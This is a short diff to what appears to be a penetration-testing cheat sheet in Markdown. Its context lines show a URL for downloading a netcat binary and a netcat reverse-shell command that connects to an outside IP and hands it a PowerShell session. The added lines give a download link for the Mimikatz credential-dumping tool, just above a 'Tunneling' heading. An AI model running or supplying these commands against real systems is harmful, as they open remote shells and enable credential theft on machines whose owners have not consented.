@@ -81,4 +81,9 @@ https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe
 nc64.exe 192.168.45.145 9001 -e powershell
 ```
 
+Mimikatz
+```
+https://raw.githubusercontent.com/ParrotSec/mimikatz/refs/heads/master/x64/mimikatz.exe
+```
+
 # Tunneling
